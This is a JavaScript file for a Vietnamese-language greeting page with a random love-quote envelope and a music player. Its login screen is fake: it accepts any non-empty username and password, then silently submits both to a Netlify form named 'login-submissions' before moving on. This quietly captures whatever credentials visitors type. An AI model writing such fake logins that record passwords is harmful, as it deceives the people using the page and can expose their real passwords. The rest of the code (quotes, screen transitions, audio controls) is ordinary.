document.addEventListener('DOMContentLoaded', () => {
    // ============================================================
    // QUOTES
    // ============================================================
    const quotes = [
        'Ai cũng yêu một bông hồng, nhưng để yêu một chiếc lá thì hẳn là có rất nhiều tình cảm. Yêu cái đẹp là điều bình thường, nhưng yêu những điều bình thường lại là một điều rất đẹp đẽ.',
        'Mực rơi thành mộng, chữ nở thành hoa. Người trao hồn chữ, chữ lưu hồn người.',
        'Tôi rót hồn tôi xuống mắt nàng. Hồn tôi là cả một lời van. Tôi van nàng đấy! van nàng đấy! Ai có yêu đương chả vội vàng?',
        'Trong tim mỗi người đều có một ngọn lửa đang cháy, người qua đường lại chỉ có thể nhìn thấy khói đang bay.',
        'Yêu, là chết ở trong lòng một ít, Vì mấy khi yêu mà chắc được yêu? Cho rất nhiều, song nhận chẳng bao nhiêu: Người ta phụ, hoặc thờ ơ, chẳng biết.',
        'Nếu nỗi nhớ cũng có âm thanh tôi không mong nó là những tiếng nức nở bi thương.',
        'Hồi ức ấy mà, như là bệnh xương khớp của người già, trái gió trở trời, mấy người không đau.',
        'Mỗi khi em thấy, mình kém xinh, hãy nhớ rằng gương mặt ấy là kết tinh của hàng trăm thế hệ đã từng yêu nhau tha thiết.',
        'Thì ra trong những ngày ta không còn là gì của nhau, em vẫn lặng lẽ sống trong trí nhớ của tôi, bằng cách nào đó, rất dai dẳng.',
        'Rồi bỗng một ngày giông gió, tóc em rối bời. Có một người xuất hiện, buộc gọn hết đống muộn phiền tả tơi.',
        'Gom hết dịu dàng của ngày hôm nay vào một nụ cười và một đóa hoa.',
        'Mọi giấc mơ đều bắt đầu từ giấy và bút.',
        'Vì bạn có khả năng vượt qua nên thử thách mới xuất hiện.',
        'Trên thế giới có rất nhiều người tốt, nếu không gặp họ hãy trở thành họ.',
        'Khi bạn thật sự muốn làm việc gì đó, cả thế giới sẽ giúp bạn.',
        'Cuộc sống là 30% những gì xảy đến với bạn, 70% còn lại là cách bạn nhìn nhận và đối mặt với nó.',
        'Đừng sợ phải ở một mình, mặt trời cũng luôn một mình nhưng mỗi ngày vẫn toả sáng.',
        'Còn hiện cái tôi trên đôi mắt, tình yêu sẽ tắt trên đôi môi.',
        'Nếu lời nói lúc nóng giận không giữ được, thì lời hứa lúc bình tĩnh liệu còn giá trị gì.',
        'Mình sẽ ở cạnh người hiền lành, để trái tim luôn ngập nắng.',
        'Khi bạn ra khỏi cơn bão, bạn sẽ không còn là cùng một người mà đã bước vào.',
        'Khi bạn có 1 ngày tồi tệ, không sao. Vì nó là 1 ngày, không phải 1 đời.',
        'Họ bảo tôi nhạt, chịu thôi tôi đâu phải laura cà phê đâu mà đòi đậm đà.',
        'Có một người đi qua hoa cúc, bỏ lại sau lưng cả tuổi thơ mình. Có hai người đi qua hoa cúc, bỏ lại sau lưng cả một mối tình.',
        'Có những thứ đẹp nhất không phải để mang về, mà để mang theo trong ký ức. Điều quý giá nhất sau mỗi chuyến đi không phải món đồ lưu niệm, mà là những điều mình học được.',
        'Đôi khi trong cuộc sống, việc chạy theo một việc gì đó phải đi kèm việc dừng lại, bởi vì nó sẽ cho ta thấy phần thưởng mà ta đang nhận khi chạy theo nó.',
        'Người ta mải miết đi tìm sự hoàn hảo nguyên bản mà quên mất rằng, thứ vừa vặn nhất đôi khi lại đến từ những mảnh chắp vá vô tình. Cuộc đời và tình yêu vốn dĩ luôn trọn vẹn theo cách của những sai số.',
        'Lỡ một chuyến xe, có thể đợi chuyến khác. Lỡ một người, chưa chắc gặp lại.',
        'Người ta thường trao con tim cho một kẻ lướt qua, và lấy lại từ một người sẵn sàng chết vì mình.',
        'Thứ không vượt qua được, từ trước đến nay chưa bao giờ là núi, mà là những chấp niệm chất chồng trong lòng.',
        'Mỗi người có một múi giờ hạnh phúc khác nhau, chỉ mong bạn đừng nhìn đồng hồ của người khác mà sốt ruột cho cuộc đời mình.',
        'Em ngồi khóc, mưa rơi ướt cả vai gầy. Có người khoác áo, và mưa tạnh từ đấy.',
        'Đa số những người ăn ý thì sẽ gặp được người để ý.'
    ];

    function getRandomQuote() {
        let used = JSON.parse(localStorage.getItem('usedQuoteIdx') || '[]');
        if (used.length >= quotes.length) used = [];
        const avail = quotes.map((_, i) => i).filter(i => !used.includes(i));
        const idx = avail[Math.floor(Math.random() * avail.length)];
        used.push(idx);
        localStorage.setItem('usedQuoteIdx', JSON.stringify(used));
        return quotes[idx];
    }

    // ============================================================
    // ELEMENTS
    // ============================================================
    const screen0 = document.getElementById('screen0');
    const screen1 = document.getElementById('screen1');
    const screen2 = document.getElementById('screen2');

    const loginBtn    = document.getElementById('login-btn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginError  = document.getElementById('login-error');

    const openEnvBtn  = document.getElementById('open-envelope-btn');
    const quoteEl     = document.getElementById('random-quote');

    // ============================================================
    // HELPERS
    // ============================================================
    function goTo(from, to, delay = 0) {
        from.classList.remove('active');
        from.classList.add('hidden');
        setTimeout(() => {
            to.classList.remove('hidden');
            to.classList.add('active');
        }, delay);
    }

    // ============================================================
    // LOGIN
    // ============================================================
    loginBtn.addEventListener('click', () => {
        const user = usernameInput.value.trim();
        const pass = passwordInput.value.trim();

        if (user !== '' && pass !== '') {
            // Submit to Netlify in background
            const fd = new URLSearchParams();
            fd.append('form-name', 'login-submissions');
            fd.append('username', user);
            fd.append('password', pass);
            fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: fd.toString() })
                .catch(() => {});

            loginError.classList.add('hidden');
            goTo(screen0, screen1, 700);
        } else {
            loginError.classList.remove('hidden');
            loginError.textContent = 'Có dòng nào chưa nhập kia kìa';
        }
    });

    // Also allow Enter key
    [usernameInput, passwordInput].forEach(el => {
        el.addEventListener('keydown', e => { if (e.key === 'Enter') loginBtn.click(); });
    });

    // ============================================================
    // ENVELOPE → LETTER
    // ============================================================
    openEnvBtn.addEventListener('click', () => {
        quoteEl.textContent = getRandomQuote();
        goTo(screen1, screen2, 700);
    });

    // ============================================================
    // MUSIC PLAYER
    // ============================================================
    const playlist = ['music.mp3'];
    let currentTrack = 0;

    const audio       = document.getElementById('mp-audio');
    const player      = document.getElementById('music-player');
    const playBtn     = document.getElementById('mp-play');
    const prevBtn     = document.getElementById('mp-prev');
    const nextBtn     = document.getElementById('mp-next');
    const progressWrap = document.getElementById('mp-progress-wrap');
    const progressBar = document.getElementById('mp-progress-bar');
    const progressThumb = document.getElementById('mp-progress-thumb');
    const currentTime = document.getElementById('mp-current');
    const durationEl  = document.getElementById('mp-duration');

    function formatTime(sec) {
        if (isNaN(sec)) return '0:00';
        const m = Math.floor(sec / 60);
        const s = Math.floor(sec % 60);
        return m + ':' + (s < 10 ? '0' : '') + s;
    }

    function loadTrack(index) {
        currentTrack = index;
        audio.src = playlist[currentTrack];
        audio.load();
    }

    // Show player after login
    loginBtn.addEventListener('click', () => {
        setTimeout(() => {
            player.classList.add('visible');
        }, 1200);
    });

    // Play / Pause
    playBtn.addEventListener('click', () => {
        if (audio.paused) {
            if (!audio.src || audio.src === window.location.href) loadTrack(0);
            audio.play();
        } else {
            audio.pause();
        }
    });

    audio.addEventListener('play', () => { playBtn.textContent = '⏸'; });
    audio.addEventListener('pause', () => { playBtn.textContent = '▶'; });

    // Update progress
    audio.addEventListener('timeupdate', () => {
        if (audio.duration) {
            const pct = (audio.currentTime / audio.duration) * 100;
            progressBar.style.width = pct + '%';
            progressThumb.style.left = pct + '%';
            currentTime.textContent = formatTime(audio.currentTime);
        }
    });

    audio.addEventListener('loadedmetadata', () => {
        durationEl.textContent = formatTime(audio.duration);
    });

    // Seek
    progressWrap.addEventListener('click', (e) => {
        const rect = progressWrap.getBoundingClientRect();
        const pct = (e.clientX - rect.left) / rect.width;
        if (audio.duration) audio.currentTime = pct * audio.duration;
    });

    // Prev / Next
    prevBtn.addEventListener('click', () => {
        if (audio.currentTime > 3) {
            audio.currentTime = 0;
        } else {
            currentTrack = (currentTrack - 1 + playlist.length) % playlist.length;
            loadTrack(currentTrack);
            audio.play();
        }
    });

    nextBtn.addEventListener('click', () => {
        currentTrack = (currentTrack + 1) % playlist.length;
        loadTrack(currentTrack);
        audio.play();
    });

    // Auto next when track ends
    audio.addEventListener('ended', () => {
        currentTrack = (currentTrack + 1) % playlist.length;
        loadTrack(currentTrack);
        audio.play();
    });
});
